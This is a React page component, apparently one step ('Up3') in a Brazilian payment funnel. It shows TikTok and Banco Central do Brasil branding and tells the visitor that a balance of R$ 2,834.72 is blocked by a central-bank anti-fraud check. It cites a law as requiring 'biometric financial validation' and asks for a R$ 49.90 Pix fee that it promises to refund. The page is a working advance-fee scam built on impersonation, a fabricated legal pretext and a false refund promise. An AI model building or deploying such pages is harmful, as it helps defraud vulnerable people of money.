import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import PixPaymentPopup from '@/components/PixPaymentPopup';
import { trackViewContent, trackClickButton } from '@/lib/tiktokPixel';
import '../styles/app.css';

const SALDO_FINAL = 2834.72;
const TAXA_TVS = 49.90;
const TAXA_TVS_CENTAVOS = 4990;

const formatBR = (value: number) => {
  return value
    .toFixed(2)
    .replace('.', ',')
    .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
};

const Up3 = () => {
  const navigate = useNavigate();
  const [showPixPopup, setShowPixPopup] = useState(false);

  useEffect(() => {
    trackViewContent('Taxa de Validação TVS', TAXA_TVS);
  }, []);

  const handlePaymentSuccess = () => {
    setShowPixPopup(false);
    navigate('/up4');
  };

  return (
    <main style={{ backgroundColor: '#f5f5f5', minHeight: '100vh', paddingBottom: '120px' }}>
      {/* Header */}
      <div style={{
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '16px',
        gap: '6px',
      }}>
        <img src="/images/tiktok-logo.png" alt="TikTok" style={{ height: '28px' }} />
      </div>

      {/* Saldo Retido Card */}
      <div style={{
        backgroundColor: '#fff',
        borderRadius: '12px',
        margin: '0 12px',
        padding: '24px 20px',
        fontFamily: 'Inter, system-ui, sans-serif',
        textAlign: 'center',
      }}>
        <p style={{
          fontSize: '12px',
          color: '#666',
          margin: '0 0 8px',
          letterSpacing: '1px',
        }}>
          SALDO RETIDO
        </p>

        <h1 style={{
          fontSize: '32px',
          fontWeight: 700,
          color: '#000',
          margin: '0 0 16px',
        }}>
          R$ {formatBR(SALDO_FINAL)}
        </h1>

        <div style={{
          display: 'inline-block',
          backgroundColor: '#dcfce7',
          color: '#16a34a',
          padding: '8px 16px',
          borderRadius: '99px',
          fontSize: '13px',
          fontWeight: 500,
        }}>
          ⚠ Pendência de Segurança nº 9082-BC
        </div>
      </div>

      {/* Motivo do Bloqueio */}
      <div style={{
        backgroundColor: '#fff',
        borderRadius: '12px',
        margin: '12px',
        padding: '20px',
        fontFamily: 'Inter, system-ui, sans-serif',
      }}>
        <div style={{
          backgroundColor: '#fefce8',
          borderLeft: '4px solid #eab308',
          padding: '14px',
          borderRadius: '0 8px 8px 0',
          marginBottom: '20px',
        }}>
          <p style={{
            fontSize: '13px',
            fontWeight: 600,
            color: '#000',
            margin: '0 0 8px',
          }}>
            ⚠ MOTIVO DO BLOQUEIO:
          </p>
          <p style={{
            fontSize: '13px',
            color: '#444',
            margin: 0,
            lineHeight: 1.5,
          }}>
            O sistema anti-fraude do Banco Central identificou uma movimentação atípica. Conforme a Lei 14.220, transferências acima de 2k exigem Validação Biométrica Financeira.
          </p>
        </div>

        <p style={{
          fontSize: '11px',
          color: '#888',
          margin: '0 0 12px',
          letterSpacing: '0.5px',
        }}>
          RESUMO
        </p>

        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          paddingBottom: '12px',
          borderBottom: '1px solid #f1f1f1',
          marginBottom: '12px',
        }}>
          <span style={{ fontSize: '14px', color: '#444' }}>Status</span>
          <span style={{ fontSize: '14px', fontWeight: 600, color: '#f97316' }}>Pausado</span>
        </div>

        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          backgroundColor: '#f8f9fb',
          padding: '14px',
          borderRadius: '8px',
        }}>
          <span style={{ fontSize: '14px', fontWeight: 500, color: '#000' }}>
            Taxa de Validação (TVS)
          </span>
          <span style={{ fontSize: '18px', fontWeight: 700, color: '#000' }}>
            R$ {formatBR(TAXA_TVS)}
          </span>
        </div>

        <div style={{
          display: 'flex',
          alignItems: 'flex-start',
          gap: '10px',
          backgroundColor: '#dcfce7',
          padding: '14px',
          borderRadius: '8px',
          marginTop: '16px',
        }}>
          <span style={{ color: '#16a34a', fontSize: '16px' }}>✓</span>
          <p style={{
            fontSize: '13px',
            color: '#166534',
            margin: 0,
            lineHeight: 1.5,
          }}>
            O valor da taxa serve apenas para confirmar titularidade e será devolvido junto com o saque.
          </p>
        </div>

        <div style={{
          display: 'flex',
          justifyContent: 'center',
          marginTop: '20px',
        }}>
          <img src="/images/bacen.png" alt="Banco Central do Brasil" style={{ height: '32px' }} />
        </div>
      </div>

      {/* Fixed Bottom Button */}
      <div style={{
        position: 'fixed',
        bottom: 0,
        left: 0,
        right: 0,
        padding: '16px',
        backgroundColor: '#fff',
        boxShadow: '0 -2px 10px rgba(0,0,0,0.05)',
      }}>
        <button
          onClick={() => setShowPixPopup(true)}
          style={{
            width: '100%',
            padding: '16px',
            backgroundColor: '#16a34a',
            color: '#fff',
            border: 'none',
            borderRadius: '99px',
            fontSize: '15px',
            fontWeight: 600,
            cursor: 'pointer',
          }}
        >
          PAGAR R$ {formatBR(TAXA_TVS)} E LIBERAR SALDO
        </button>
        <p style={{
          fontSize: '12px',
          color: '#16a34a',
          textAlign: 'center',
          marginTop: '8px',
          marginBottom: 0,
        }}>
          Reembolso Automático
        </p>
      </div>

      {showPixPopup && (
        <PixPaymentPopup
          amount={TAXA_TVS_CENTAVOS}
          description="Taxa de Validação TVS"
          onSuccess={handlePaymentSuccess}
          onClose={() => setShowPixPopup(false)}
        />
      )}
    </main>
  );
};

export default Up3;
